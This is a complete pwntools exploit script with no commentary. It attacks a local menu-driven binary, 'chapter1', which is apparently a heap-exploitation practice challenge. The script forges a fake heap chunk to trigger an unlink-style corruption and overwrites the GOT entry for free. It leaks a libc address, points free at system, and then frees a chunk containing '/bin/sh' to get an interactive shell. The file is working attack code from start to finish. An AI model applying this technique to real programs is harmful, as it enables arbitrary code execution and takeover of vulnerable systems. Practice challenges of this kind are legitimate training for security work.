#!/usr/bin/env python3

from pwn import *

e = ELF("./chapter1")
libc = ELF("./libc.so.6")
r = process("./chapter1")
index = 0
def malloc(size,data):
    global index
    r.sendlineafter(b">>",b"1")
    r.sendlineafter(b"Size:",f"{size}")
    r.sendafter(b"Data:",data)
    index+=1
    return index - 1

def edit(index,data):
    r.sendlineafter(b">>",b"2")
    r.sendlineafter(b"Index:",f"{index}")
    r.sendafter(b"Data:",data)

def delete(index):
    r.sendlineafter(b">>",b"3")
    r.sendlineafter(b"Index:",f"{index}")

def leak(index):
    r.sendlineafter(b">>",b"3")
    r.sendlineafter(b"Index:",f"{index}")
    leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
    return leak

chunk_A = malloc(0xc8,b"/bin/sh\x00")
chunk_B = malloc(0xc8,b"B" * 8)
chunk_C = malloc(0xc8,b"C" * 8)
chunk_D = malloc(0xc8,b"D" * 8)
chunk_E = malloc(0xc8,b"E" * 0xc8)
chunk_F = malloc(0xc8,b"F" * 8)
chunk_G = malloc(0x28,b"G" * 8)
edit(chunk_E,p64(0) + p64(0xc1) + p64(0x6020c8) + p64(0x6020d0) + b"E" * 0xa0 + p64(0xc0) + p8(0xd0))
delete(chunk_F)
chunk_H = malloc(0x188,p8(0x78))
edit(chunk_E,p32(e.got.free))
edit(chunk_B,p32(0x400c59) + b"\x00" * 2)
libc_base = leak(chunk_F) - 0x3c4b78
log.info("The libc base of the process is " + hex(libc_base))
edit(chunk_B,p32(e.plt.free + 6))
delete(chunk_G)
edit(chunk_B,p64(libc_base + libc.sym.system))
delete(chunk_A)
r.interactive()

